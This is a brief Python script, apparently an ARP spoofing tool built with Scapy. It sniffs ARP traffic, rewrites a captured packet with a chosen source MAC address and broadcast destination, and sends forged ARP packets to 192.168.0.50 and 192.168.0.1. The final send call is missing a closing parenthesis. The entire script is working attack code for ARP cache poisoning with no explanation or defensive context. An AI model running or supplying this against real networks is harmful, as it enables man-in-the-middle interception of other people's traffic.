from scapy.all import *

pkts = sniff(count=5,filter="arp")

pkts.summary()

arppkt = eval(pkts[0].command())
arppkt[ARP].hwsrc = "08:d4:0c:c4:3b:32"
arppkt[ARP].pdst = "192.168.0.50"
arppkt[Ether].dst = "ff:ff:ff:ff:ff:ff"

arppkt

sendp(arppkt)

sendp(Ether(dst="ff:ff:ff:ff:ff:ff",src="08:d4:0c:c4:3b:32")/ARP(hwsrc="08:d4:0c:c4:3b:32",pdst="192.168.0.1")

# for packet in pkts:
#     packet.show()
